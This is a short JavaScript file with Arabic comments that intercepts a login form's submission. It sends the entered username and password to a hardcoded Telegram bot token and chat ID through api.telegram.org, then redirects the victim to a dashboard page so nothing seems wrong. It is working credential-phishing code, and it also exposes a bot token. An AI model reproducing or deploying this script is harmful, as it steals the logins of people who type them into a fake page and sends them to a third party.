document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault(); // منع إعادة تحميل الصفحة

    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;

    let botToken = "8196459609:AAFFRJTY7XJ8OSVfEIVT76hf6uRiM4byJ1Y";  // ضع توكن البوت هنا
    let chatId = "7302541527"; // ضع معرف الدردشة هنا

    let message = `🔥 تسجيل دخول جديد 🔥\n👤 اسم المستخدم: ${username}\n🔒 كلمة المرور: ${password}`;

    let telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(telegramApi)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("تم إرسال البيانات بنجاح!");
                window.location.href = "dashboard.html"; // توجيه المستخدم بعد تسجيل الدخول
            } else {
                alert("حدث خطأ أثناء الإرسال!");
            }
        })
        .catch(error => {
            console.error("Error:", error);
            alert("تعذر إرسال البيانات إلى تليجرام.");
        });
});
